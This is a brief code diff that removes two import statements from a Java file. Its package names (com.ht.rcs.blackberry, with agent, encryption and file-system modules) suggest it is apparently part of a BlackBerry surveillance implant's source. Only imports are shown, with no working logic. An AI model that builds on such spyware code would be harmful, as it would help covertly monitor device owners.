@@ -16,12 +16,10 @@ import javax.microedition.io.Connector;
 import javax.microedition.io.file.FileConnection;
 
 import net.rim.device.api.util.DataBuffer;
-import net.rim.device.api.util.NumberUtilities;
 
 import com.ht.rcs.blackberry.Device;
 import com.ht.rcs.blackberry.agent.Agent;
 import com.ht.rcs.blackberry.crypto.Encryption;
-import com.ht.rcs.blackberry.fs.AutoFlashFile;
 import com.ht.rcs.blackberry.fs.Path;
 import com.ht.rcs.blackberry.utils.Check;
 import com.ht.rcs.blackberry.utils.DateTime;
